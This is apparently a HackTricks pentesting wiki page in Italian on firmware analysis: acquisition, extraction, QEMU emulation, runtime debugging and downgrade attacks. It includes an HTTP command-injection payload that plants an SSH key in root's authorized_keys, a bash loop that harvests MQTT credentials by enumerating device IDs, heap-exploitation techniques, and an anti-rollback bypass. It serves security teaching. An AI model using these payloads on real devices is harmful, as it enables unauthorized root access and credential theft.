# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduzione**

### Risorse correlate

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente, gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui interagiscono gli utenti. È memorizzato in una memoria permanente, in modo che il dispositivo possa accedere alle istruzioni fondamentali fin dal momento dell'accensione, avviando così il sistema operativo. Esaminare ed eventualmente modificare il firmware è un passaggio fondamentale per individuare vulnerabilità di sicurezza.<sup>[[2]](#references)[[3]](#references)</sup>

## **Raccolta di informazioni**

La **raccolta di informazioni** è un passaggio iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo prevede la raccolta di dati su:

- L'architettura della CPU e il sistema operativo in esecuzione
- I dettagli del bootloader
- La disposizione dell'hardware e le schede tecniche
- Le metriche del codebase e le posizioni del codice sorgente
- Le librerie esterne e i tipi di licenza
- La cronologia degli aggiornamenti e le certificazioni normative
- I diagrammi dell'architettura e dei flussi
- Le valutazioni di sicurezza e le vulnerabilità individuate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi dei componenti software open source disponibili tramite processi di revisione manuali e automatizzati. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statica gratuite che possono essere utilizzate per individuare potenziali problemi.

## **Acquisizione del firmware**

È possibile ottenere il firmware in diversi modi, ciascuno con un diverso livello di complessità:

- Ottenerlo **direttamente** dalla fonte (sviluppatori, produttori)
- **Compilarlo** seguendo le istruzioni fornite
- **Scaricarlo** dai siti di supporto ufficiali
- Utilizzare query **Google dork** per trovare file firmware ospitati online
- Accedere direttamente allo **cloud storage**, utilizzando strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettare gli **aggiornamenti** con tecniche man-in-the-middle
- **Estrarlo** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- **Monitorare** le richieste di aggiornamento nelle comunicazioni del dispositivo
- Individuare e utilizzare gli **endpoint di aggiornamento hardcoded**
- **Eseguire il dump** dal bootloader o dalla rete
- **Rimuovere e leggere** il chip di memoria, come ultima risorsa, utilizzando gli strumenti hardware appropriati

### Log solo UART: forzare una root shell tramite le variabili d'ambiente di U-Boot nella flash

Se RX di UART viene ignorato (sono disponibili solo i log), è comunque possibile forzare una shell init **modificando offline il blob dell'ambiente U-Boot**:<sup>[[6]](#references)</sup>

1. Eseguire il dump della flash SPI con una clip SOIC-8 e un programmatore (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Individua la partizione env di U-Boot, modifica `bootargs` per includere `init=/bin/sh` e **ricalcola il CRC32 dell'env U-Boot** per il blob.
3. Riflash solo la partizione env e riavvia; dovrebbe apparire una shell su UART.

Questo è utile sui dispositivi embedded in cui la shell del bootloader è disabilitata, ma la partizione env è scrivibile tramite accesso alla flash esterna.

## Analisi del firmware

Ora che **hai il firmware**, devi estrarne informazioni per capire come gestirlo. Ecco alcuni strumenti che puoi usare:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Se non trovi molto con questi strumenti, controlla l’**entropia** dell’immagine con `binwalk -E <bin>`: se è bassa, probabilmente non è cifrata. Se è alta, probabilmente è cifrata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre i **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure puoi usare [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per esaminare il file.

### Ottenere il filesystem

Con gli strumenti menzionati in precedenza, come `binwalk -ev <bin>`, dovresti essere riuscito a **estrarre il filesystem**.\
Binwalk di solito lo estrae in una **cartella il cui nome corrisponde al tipo di filesystem**, che in genere è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte, binwalk **non include i magic byte del filesystem tra le proprie firme**. In questi casi, usa binwalk per **trovare l’offset del filesystem e fare il carving del filesystem compresso** dal binario, quindi **estrai manualmente** il filesystem in base al suo tipo, seguendo i passaggi riportati di seguito.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Esegui il seguente **comando dd** per effettuare il carving del filesystem Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

In alternativa, è possibile eseguire anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio precedente)

`$ unsquashfs dir.squashfs`

I file si troveranno successivamente nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per i filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per i filesystem ubifs con flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del firmware

Una volta ottenuto il firmware, è essenziale esaminarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo prevede l'uso di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti per l'analisi iniziale

Di seguito è riportato un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare i dati binari e comprendere i dettagli delle partizioni e dei filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Per valutare lo stato della cifratura dell’immagine, si controlla l’**entropia** con `binwalk -E <bin>`. Una bassa entropia suggerisce l’assenza di cifratura, mentre un’alta entropia indica una possibile cifratura o compressione.

Per estrarre i **file incorporati**, si consigliano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l’ispezione dei file.

### Estrazione del filesystem

Con `binwalk -ev <bin>`, di solito è possibile estrarre il filesystem, spesso in una directory il cui nome corrisponde al tipo di filesystem (ad es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem perché mancano i magic bytes, è necessario procedere all’estrazione manualmente. Si individua l’offset del filesystem con `binwalk`, quindi si usa il comando `dd` per estrarlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Successivamente, a seconda del tipo di filesystem (ad es. squashfs, cpio, jffs2, ubifs), si usano comandi diversi per estrarne manualmente i contenuti.

### Analisi del filesystem

Una volta estratto il filesystem, inizia la ricerca di vulnerabilità. Si presta attenzione ai daemon di rete non sicuri, alle credenziali hardcoded, agli endpoint API, alle funzionalità dei server di aggiornamento, al codice non compilato, agli script di avvio e ai binari compilati da analizzare offline.

**Percorsi** e **elementi chiave** da esaminare includono:

- **etc/shadow** e **etc/passwd** per le credenziali utente
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per individuare potenziali vulnerabilità
- Binari embedded da analizzare ulteriormente
- Server web e binari comuni dei dispositivi IoT

Diversi strumenti aiutano a individuare informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un'analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ed [**EMBA**](https://github.com/e-m-b-a/emba) per l'analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

Nel filesystem è necessario esaminare attentamente sia il codice sorgente sia i binari compilati, per individuare eventuali vulnerabilità. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per quelli Windows aiutano a identificare i binari privi di protezioni che potrebbero essere sfruttati.

## Raccolta di configurazioni cloud e credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la configurazione specifica di ciascun dispositivo da un endpoint cloud simile a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware, potresti scoprire che `<token>` viene derivato localmente dall'ID del dispositivo usando un segreto hardcoded, ad esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato in formato esadecimale maiuscolo

Questo design consente a chiunque conosca un deviceId e lo STATIC_KEY di ricostruire l'URL e recuperare la configurazione cloud, spesso rivelando credenziali MQTT in testo semplice e prefissi dei topic.

Procedura pratica:

1) Estrai deviceId dai log di avvio UART

- Collega un adattatore UART da 3,3 V (TX/RX/GND) e acquisisci i log:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Cerca le righe che stampano il pattern dell'URL di configurazione cloud e l'indirizzo del broker, ad esempio:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperare STATIC_KEY e l’algoritmo del token dal firmware

- Carica i binari in Ghidra/radare2 e cerca il percorso di configurazione ("/pf/") o l’uso di MD5.
- Conferma l’algoritmo (ad es., MD5(deviceId||STATIC_KEY)).
- Deriva il token in Bash e converti l’hash in maiuscolo:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Raccogli la configurazione cloud e le credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i segreti:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Sfruttare MQTT in chiaro e ACL deboli sui topic (se presenti)

- Usa le credenziali recuperate per sottoscriversi ai topic di manutenzione e cercare eventi sensibili:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerare ID di dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI/prodotto/tipo del vendor seguiti da un suffisso sequenziale.
- È possibile iterare sugli ID candidati, derivare token e recuperare configurazioni in modo programmatico:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Note
- Ottieni sempre un'autorizzazione esplicita prima di tentare l'enumerazione di massa.
- Quando possibile, preferisci l'emulazione o l'analisi statica per recuperare i segreti senza modificare l'hardware di destinazione.

Il processo di emulazione del firmware consente la **dynamic analysis** del funzionamento di un dispositivo o di un singolo programma. Questo approccio può presentare difficoltà legate alle dipendenze dall'hardware o dall'architettura; tuttavia, trasferire il root filesystem o specifici binari su un dispositivo con architettura e endianness corrispondenti, come un Raspberry Pi, oppure su una macchina virtuale preconfigurata, può agevolare ulteriori test.

### Emulazione di singoli binari

Per esaminare singoli programmi, è fondamentale identificare l'endianness e l'architettura CPU del programma.

#### Esempio con architettura MIPS

Per emulare un binario per architettura MIPS, si può usare il comando:

```bash
file ./squashfs-root/bin/busybox
```

E per installare gli strumenti di emulazione necessari:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Per MIPS (big-endian), si usa `qemu-mips`; per i binari little-endian, si può usare `qemu-mipsel`.

#### Emulazione dell’architettura ARM

Per i binari ARM, il processo è simile: per l’emulazione si utilizza l’emulatore `qemu-arm`.

### Emulazione dell’intero sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri facilitano l’emulazione completa del firmware, automatizzando il processo e supportando l’analisi dinamica.

### Ricostruzione di filesystem root suddivisi e verificati per l’emulazione

Se un superblock SquashFS è leggibile, ma gli offset di inode, directory o fragment table risultano impossibili, non correggere subito `unsquashfs`. Effettua il reverse engineering del binario di avvio iniziale e riproduci il grafo dei dispositivi a blocchi che crea: i sistemi embedded possono esporre una partizione root nominale, ma creare il filesystem effettivo con una mappatura `dm-linear` che aggiunge settori presi in prestito da un’altra partizione. I controlli basati solo sul superblock possono riuscire anche quando tutti i successivi blocchi di metadati sono spostati.<sup>[[9]](#references)</sup>

Riproduci esattamente i calcoli aritmetici del firmware. In particolare, individua se le lunghezze sono espresse in byte, settori da 512 byte o pagine da 4 KiB; riproduci gli shift e il troncamento nell’ordine originale; e considera le regioni finali dipendenti dal bank nei layout A/B. Per esempio, `(partition_bytes >> 12) << 3` prima tronca a un multiplo di 4 KiB e solo dopo esprime il risultato in settori da 512 byte; sostituirlo con `partition_bytes // 512` può spostare di alcuni kilobyte l’estensione aggiunta e corrompere tutte le tabelle SquashFS successive.<sup>[[9]](#references)</sup>

Un flusso di convalida utile è:<sup>[[9]](#references)</sup>

1. Recupera dal binario del verifier/init il dispositivo sorgente, il settore iniziale e la lunghezza di ogni segmento `dm-linear`.
2. Concatena o mappa le estensioni senza modificarne la semantica di allineamento.
3. Se l’estrazione continua a non riuscire, cerca solo in una piccola finestra intorno al limite previsto e richiedi diverse strutture di metadati valide consecutive, invece di accettare un solo superblock plausibile.
4. Esegui `unsquashfs` non modificato sull’immagine ricostruita; la corretta esplorazione di tutte le directory e dei fragment è una prova più solida di `unsquashfs -stat`.

#### Sostituzione di dm-verity controllata dall’analista

Quando l’analista controlla il kernel QEMU, l’initramfs e i dischi virtuali, è possibile avviare una root modificata sostituendo il PID 1 di verifica del vendor con un piccolo init linkato staticamente. Si tratta di una **sostituzione della catena di avvio in laboratorio**, non di una violazione di dm-verity, della sua firma RSA, di Secure Boot o di una chiave sigillata tramite TPM.<sup>[[9]](#references)</sup>

L’init sostitutivo dovrebbe riprodurre le fasi operative del percorso di avvio originale: montare `devtmpfs`, chiamare `setsid()`, collegare `/dev/console` ai file descriptor 0–2, montare `/proc` e `/sys`, attendere il dispositivo a blocchi fornito, montare la root modificata in sola lettura, scollegare i pseudo-filesystem della vecchia root, spostare il nuovo mount su `/`, eseguire `chroot` e `execve()` sul `/sbin/init` originale del firmware. Scollegare `/dev`, `/proc` e `/sys` **prima** di `MS_MOVE` evita di scollegare accidentalmente i punti di mount appartenenti alla nuova root.<sup>[[9]](#references)</sup>

Mantieni lo stato mutabile del dispositivo separato dalla root immutabile modificata. Un overlay qcow2 può preservare lo stato LVM del disco originale, mentre un secondo disco virtio in sola lettura fornisce il SquashFS modificato:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugging offline dello stato dell'immagine

Esamina lo stato persistente al di fuori del guest quando avvii lenti, script di avvio distruttivi o log della console inaffidabili rendono difficile individuare il problema. Non collegare mai un overlay utilizzato da una VM in esecuzione; esponilo con `qemu-nbd`, limita il rilevamento LVM alla partizione NBD desiderata e disattiva il gruppo di volumi prima di disconnetterlo.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Per un'isolamento dei guasti ripetibile, scrivi file marker con timestamp su un volume scrivibile stabile e verificali offline; `/dev/kmsg`, le FIFO e le console transitorie possono produrre falsi negativi a causa del rate limiting o della terminazione prematura dei processi. Inoltre, confronta le interfacce esatte tra i vari livelli prima di modificare codice non correlato: `uname -r` rispetto a `/lib/modules/`, le funzionalità ext4 su disco rispetto alla configurazione del kernel e la generazione Mesa di `libGL` rispetto all'ABI del driver DRI e ai nomi dei driver derivati dal PCI. Un componente può esistere e persino essere caricato correttamente con `dlopen()`, ma restare inutilizzabile perché il suo consumer si aspetta un ABI diverso.<sup>[[9]](#references)</sup>

## Analisi dinamica nella pratica

In questa fase, per l'analisi si utilizza un ambiente con dispositivo reale o emulato. È essenziale mantenere l'accesso alla shell del sistema operativo e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni hardware, rendendo necessari occasionali riavvii dell'emulazione. L'analisi dovrebbe esaminare nuovamente il filesystem, sfruttare le pagine web e i servizi di rete esposti ed esplorare le vulnerabilità del bootloader. I test di integrità del firmware sono fondamentali per individuare potenziali vulnerabilità backdoor.

## Tecniche di analisi runtime

L'analisi runtime consiste nell'interagire con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e identificare vulnerabilità tramite fuzzing e altre tecniche.

Per i target embedded senza un debugger completo, **copia un `gdbserver` collegato staticamente** sul dispositivo e connettiti da remoto:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mappatura dei messaggi Zigbee / radio-co-processor

Negli hub IoT lo stack RF è spesso suddiviso tra un **radio MCU** e un processo userland Linux. Un flusso di lavoro utile consiste nel mappare il percorso:<sup>[[8]](#references)</sup>

1. **Frame RF** trasmesso via radio
2. **Parser lato controller** sul radio MCU
3. **Protocollo testuale seriale/UART o TLV** inoltrato a Linux (ad esempio `/dev/tty*`)
4. **Dispatcher dell'applicazione** nel daemon principale
5. **Handler specifico del protocollo / macchina a stati**

Questa architettura crea due obiettivi di reverse engineering anziché uno. Se il controller converte i frame radio binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, ricostruisci:

- I **gruppi di messaggi** e le tabelle di dispatch
- Quali messaggi possono provenire dalla **rete** e quali dal controller stesso
- Gli esatti **campi discriminanti specifici del produttore** (ad esempio Zigbee `manufacturer_code` e `cluster_command` personalizzato)
- Quali handler sono raggiungibili solo durante le fasi di **commissioning**, discovery o download del firmware/modello

Per Zigbee, nello specifico, acquisisci il traffico di pairing e verifica se il target si affida ancora alla **Link Key** predefinita `ZigBeeAlliance09`. In tal caso, sniffare il traffico di commissioning potrebbe esporre la **Network Key**. Gli install code di Zigbee 3.0 riducono questa esposizione: verifica quindi se il dispositivo testato li applica davvero.

### Handler di protocollo specifici del produttore e raggiungibilità controllata dalle FSM

I comandi Zigbee/ZCL specifici del produttore sono spesso un obiettivo migliore dei cluster standardizzati, perché alimentano **codice di parsing personalizzato** e **FSM** interne con validazioni meno collaudate.<sup>[[8]](#references)</sup>

Flusso di lavoro pratico:

- Analizza il dispatcher dei comandi finché non trovi l'**handler riservato al produttore**.
- Ricostruisci le tabelle di **stato della FSM**, **evento**, **controllo**, **azione** e **stato successivo**.
- Individua gli **stati transitori** che avanzano automaticamente e i rami di retry/errore che alla fine resettano o liberano lo stato controllato dall'attaccante.
- Verifica quali scambi di protocollo legittimi sono necessari per portare il daemon nello stato vulnerabile, invece di presumere che l'handler vulnerabile sia sempre raggiungibile.

Per i protocolli sensibili ai tempi, il replay dei pacchetti da un framework Python potrebbe essere troppo lento. Un approccio più affidabile consiste nell'emulare un dispositivo legittimo su hardware reale (ad esempio un **nRF52840**) con uno stack di livello professionale del produttore, così da esporre gli **endpoint**, gli **attributi** e i tempi di commissioning corretti.

### Classe di bug nei download frammentati nei daemon embedded

Una classe di bug ricorrente nei firmware si presenta nei download **frammentati di blob/modelli/configurazioni**:<sup>[[8]](#references)</sup>

1. Il **primo frammento** (`offset == 0`) memorizza `ctx->total_size` e alloca `malloc(total_size)`.
2. I frammenti successivi convalidano solo i campi **locali al pacchetto** controllati dall'attaccante, ad esempio `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza verificare che non superi la **dimensione allocata originale**.

Questo permette all'attaccante di inviare:

- Un primo frammento valido con una dimensione totale dichiarata **piccola**, per forzare una piccola allocazione heap.
- Un frammento successivo con l'**offset previsto**, ma con un `chunk_len` maggiore.
- Una dimensione locale al pacchetto falsificata che supera i nuovi controlli, causando comunque un overflow del buffer allocato inizialmente.

Quando il percorso vulnerabile è dietro alla logica di commissioning, lo sfruttamento deve includere un livello sufficiente di **emulazione del dispositivo** per portare il target nello stato previsto di download del modello o del blob prima di inviare i frammenti malformati.

### Trigger di `free()` guidati dal protocollo

Nei daemon embedded, il modo più semplice per attivare lo sfruttamento dei metadati dell'heap spesso non è «attendere la pulizia», ma **forzare la gestione degli errori del protocollo**:<sup>[[8]](#references)</sup>

- Invia frammenti successivi malformati per portare la FSM negli stati di **retry** o **errore**.
- Supera la soglia di retry, così che il daemon **resetti il contesto** e liberi il buffer corrotto.
- Sfrutta questo `free()` prevedibile per attivare primitive lato allocator prima che il processo vada in crash per ragioni non correlate.

Questo è particolarmente utile contro gli allocator **simili a musl/uClibc/dlmalloc** in Linux embedded, dove corrompere i metadati dei chunk può trasformare la logica unlink/unbin in una primitiva di scrittura. Una tecnica stabile consiste nel corrompere un **campo size** per reindirizzare l'attraversamento dell'allocator verso **fake chunk predisposti nel buffer soggetto a overflow**, invece di sovrascrivere subito i puntatori reali delle bin e mandare il processo in crash.

## Sfruttamento dei binari e proof of concept

Lo sviluppo di una PoC per le vulnerabilità individuate richiede una conoscenza approfondita dell'architettura target e la programmazione in linguaggi di basso livello. Le protezioni runtime dei binari sono rare nei sistemi embedded, ma quando sono presenti potrebbero essere necessarie tecniche come Return Oriented Programming (ROP).

### Note sullo sfruttamento dei fastbin di uClibc (Linux embedded)

- **Fastbin + consolidamento:** uClibc usa fastbin simili a quelli di glibc. Un'allocazione grande successiva può attivare `__malloc_consolidate()`, quindi ogni fake chunk deve superare i controlli (dimensione valida, `fd = 0` e chunk circostanti considerati «in uso»).<sup>[[6]](#references)</sup>
- **Binari non-PIE con ASLR:** se ASLR è abilitato ma il binario principale è **non-PIE**, gli indirizzi `.data/.bss` interni al binario sono stabili. È possibile puntare a un'area che assomiglia già a un header valido di chunk heap, facendo sì che un'allocazione fastbin finisca su una **tabella di puntatori a funzione**.
- **NUL che interrompe il parser:** durante il parsing di JSON, un `\x00` nel payload può interrompere il parsing lasciando comunque i byte successivi controllati dall'attaccante, utili per un pivot dello stack o una catena ROP.
- **Shellcode tramite `/proc/self/mem`:** una catena ROP che chiama `open("/proc/self/mem")`, `lseek()` e `write()` può inserire shellcode eseguibile in una mappatura nota e saltarvi.

## Sistemi operativi predisposti per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) ed [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per i test di sicurezza del firmware, dotati degli strumenti necessari.

## Sistemi operativi predisposti per l'analisi del firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distribuzione pensata per aiutarti a eseguire valutazioni della sicurezza e penetration test sui dispositivi Internet of Things (IoT). Fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già installati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo basato su Ubuntu 18.04 per i test di sicurezza embedded, con strumenti per i test di sicurezza del firmware preinstallati.

## Attacchi di downgrade del firmware e meccanismi di aggiornamento non sicuri

Anche quando un produttore implementa controlli crittografici della firma delle immagini firmware, spesso **omette la protezione dal rollback (downgrade) della versione**. Se il bootloader o il recovery loader verifica solo la firma con una chiave pubblica incorporata, senza confrontare la *versione* (o un contatore monotono) dell'immagine da installare, un attaccante può installare legittimamente un **firmware più vecchio e vulnerabile, ma ancora dotato di una firma valida**, reintroducendo così vulnerabilità già corrette.<sup>[[4]](#references)</sup>

Flusso di attacco tipico:

1. **Recuperare una vecchia immagine firmata**
   * Scaricarla dal portale pubblico di download del produttore, dal CDN o dal sito di supporto.
   * Estrarla dalle app companion per dispositivi mobili o desktop (ad esempio da `assets/firmware/` all'interno di un APK Android).
   * Recuperarla da repository di terze parti come VirusTotal, archivi Internet, forum ecc.
2. **Caricare o fornire l'immagine al dispositivo** tramite un qualsiasi canale di aggiornamento esposto:
   * Interfaccia web, API dell'app mobile, USB, TFTP, MQTT ecc.
   * Molti dispositivi IoT consumer espongono endpoint HTTP(S) *non autenticati* che accettano blob firmware codificati in Base64, li decodificano lato server e avviano il ripristino o l'aggiornamento.
3. Dopo il downgrade, sfruttare una vulnerabilità corretta in una versione più recente (ad esempio un filtro per la command injection aggiunto in seguito).
4. Facoltativamente, reinstallare l'immagine più recente o disabilitare gli aggiornamenti per evitare di essere individuati dopo aver ottenuto la persistenza.

### Esempio: command injection dopo il downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Nel firmware vulnerabile (downgradato), il parametro `md5` viene concatenato direttamente a un comando shell senza sanificazione, consentendo l’injection di comandi arbitrari (in questo caso, abilitando l’accesso root tramite chiave SSH). Le versioni successive del firmware hanno introdotto un filtro di base dei caratteri, ma l’assenza di protezione dal downgrade rende la correzione inefficace.<sup>[[4]](#references)</sup>

### Estrazione del firmware dalle app mobile

Molti vendor includono immagini firmware complete nelle app mobile associate, affinché l’app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti sono comunemente archiviati non crittografati nell’APK/APEX, in percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra` o anche il semplice `unzip` consentono di estrarre immagini firmate senza dover accedere all’hardware fisico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass anti-rollback limitato all’updater nei design con slot A/B

Alcuni vendor implementano un **ratchet** anti-downgrade, ma solo nella logica dell’*updater* (per esempio, una routine UDS su CAN, un comando di recovery o un agente OTA in userspace). Se in seguito il **bootloader** controlla solo la firma/CRC dell’immagine e si fida della tabella delle partizioni o dei metadati degli slot, è ancora possibile bypassare la protezione dal rollback.<sup>[[7]](#references)</sup>

Design debole tipico:

- I metadati del firmware contengono sia un descrittore della versione sia un **ratchet di sicurezza** / contatore monotono.
- L’updater confronta il ratchet dell’immagine con un valore memorizzato in uno storage persistente e rifiuta le immagini firmate più vecchie.
- Il bootloader **non** analizza quel ratchet e verifica solo header, CRC e firma prima di avviare lo slot selezionato.
- L’attivazione dello slot viene memorizzata separatamente in una tabella delle partizioni o in un contatore di generazione per slot e **non è legata crittograficamente** all’hash esatto del firmware convalidato.

Nei sistemi dual-slot, questo crea una primitiva per **convalidare un’immagine e avviarne un’altra**. Se l’attaccante riesce a far impostare all’updater lo slot B come destinazione del prossimo avvio usando un’immagine firmata corrente, e in seguito può sovrascrivere lo slot B prima del riavvio, il bootloader potrebbe comunque avviare l’immagine con downgrade perché si fida solo dei metadati dello slot già salvati.

Schema di abuso comune:

1. Carica un firmware **firmato e corrente** nello slot passivo ed esegui la normale routine di convalida/switch, in modo che il layout indichi quello slot come prossimo attivo.
2. **Non riavviare ancora**. Rientra nella routine di preparazione/cancellazione dello slot nella stessa sessione.
3. Sfrutta lo stato di avvio obsoleto o la logica di selezione dello slot obsoleta, in modo che l’updater cancelli **lo stesso slot fisico** appena promosso.
4. Scrivi in quello slot un firmware **più vecchio ma ancora firmato**.
5. Salta la routine di convalida che applica il ratchet e riavvia direttamente.
6. Il bootloader seleziona lo slot promosso, verifica solo firma/integrità e avvia la vecchia immagine.

